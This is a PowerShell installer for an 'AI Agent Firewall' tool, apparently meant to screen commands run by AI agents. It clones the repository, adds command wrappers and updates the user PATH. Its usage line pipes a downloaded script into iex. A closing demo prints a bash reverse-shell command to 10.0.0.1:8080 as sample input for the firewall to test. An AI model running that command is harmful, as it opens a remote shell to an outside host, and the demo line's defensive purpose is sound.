# AI Agent Firewall Installer for Windows (PowerShell)
# Usage: irm https://raw.githubusercontent.com/deveshmishra11291/ai-agent-firewall/main/install.ps1 | iex

Write-Host "┌──────────────────────────────────────────────────────────────┐" -ForegroundColor Cyan
Write-Host "│  🛡️  AI AGENT FIREWALL — WINDOWS INSTALLER                    │" -ForegroundColor Cyan
Write-Host "└──────────────────────────────────────────────────────────────┘" -ForegroundColor Cyan

# Check for node
if (-not (Get-Command node -ErrorAction SilentlyContinue)) {
    Write-Host "Error: Node.js (v18+) is required but not installed." -ForegroundColor Red
    Write-Host "Please download and install Node.js from https://nodejs.org/" -ForegroundColor Yellow
    Exit
}

$InstallDir = "$HOME\.agent-firewall"
$RepoUrl = "https://github.com/deveshmishra11291/ai-agent-firewall.git"

Write-Host "Installing AI Agent Firewall into $InstallDir..." -ForegroundColor Yellow

if (Test-Path $InstallDir) {
    Set-Location $InstallDir
    git pull origin main --quiet
} else {
    git clone --depth 1 $RepoUrl $InstallDir --quiet
}

# Create dedicated bin directory with native .cmd batch wrappers
$BinDir = "$InstallDir\bin"
if (-not (Test-Path $BinDir)) {
    New-Item -ItemType Directory -Path $BinDir -Force | Out-Null
}

$CmdScript = "@echo off`r`nnode `"%~dp0\..\cli\bin\agent-firewall.js`" %*"
Set-Content -Path "$BinDir\aaf.cmd" -Value $CmdScript
Set-Content -Path "$BinDir\ai-firewall.cmd" -Value $CmdScript
Set-Content -Path "$BinDir\agent-firewall.cmd" -Value $CmdScript

# Ensure $BinDir is in User Environment PATH and current session
$UserPath = [Environment]::GetEnvironmentVariable("Path", [EnvironmentVariableTarget]::User)
if ($UserPath -notlike "*$BinDir*") {
    $NewUserPath = "$BinDir;$UserPath"
    [Environment]::SetEnvironmentVariable("Path", $NewUserPath, [EnvironmentVariableTarget]::User)
}
$env:Path = "$BinDir;$env:Path"

Set-Location "$InstallDir\cli"
try {
    npm link --silent 2>$null
} catch {}

Write-Host "`n✓ AI Agent Firewall successfully installed on Windows!" -ForegroundColor Green
Write-Host "Commands available: aaf, ai-firewall, agent-firewall`n" -ForegroundColor Green

Write-Host "Try it right now:" -ForegroundColor Cyan
Write-Host "  aaf --help" -ForegroundColor White
Write-Host "  aaf test `"bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`"" -ForegroundColor White
Write-Host "  aaf watch ." -ForegroundColor White
